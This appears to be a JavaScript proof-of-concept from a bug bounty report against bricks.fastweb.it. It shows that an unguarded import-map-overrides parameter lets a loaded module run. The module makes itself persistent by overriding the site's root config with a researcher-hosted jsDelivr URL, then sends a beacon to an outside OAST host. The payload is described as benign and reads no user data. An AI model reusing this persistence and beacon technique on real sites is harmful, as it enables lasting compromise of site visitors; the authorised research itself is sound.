/*
 * FW-08 proof-of-concept marker - AUTHORISED BUG BOUNTY TESTING ONLY
 *
 * Fastweb "General" programme via CyberDart, scope *.fastweb.it, researcher 89p13.
 * Demonstrates that a module loaded through the unguarded import-map-overrides
 * "imo" parameter on bricks.fastweb.it executes, can make itself persistent, and
 * can reach the network.
 *
 * DELIBERATELY BENIGN. It does not read cookies, storage, form fields, credentials
 * or any user data, and it does not alter the page. It only proves capability.
 */
(function () {
  var MARKER = "fw08-89p13";
  var OAST   = "https://da8l7djc8q36i3t2sqc048gyde3kjnmq9.oast.me/fw08-payload-89p13";
  try { window.__FW08_MARKER__ = MARKER; } catch (e) {}
  try { console.log("[" + MARKER + "] executing on " + location.origin); } catch (e) {}

  // 1. Self-persistence: the payload itself installs the override, so the next
  //    visit needs no link and no parameter.
  try {
    if (window.importMapOverrides && window.importMapOverrides.addOverride) {
      window.importMapOverrides.addOverride(
        "@fastweb-tmt/root-config",
        "https://cdn.jsdelivr.net/gh/89p1rPWN/fw08-poc@main/fw08-marker.js"
      );
      console.log("[" + MARKER + "] self-persisted via addOverride");
    }
  } catch (e) {}

  // 2. Egress: a static marker only - no page content, no user data.
  try { fetch(OAST + "?m=" + MARKER + "&o=" + encodeURIComponent(location.origin), {mode: "no-cors"}); } catch (e) {}
})();
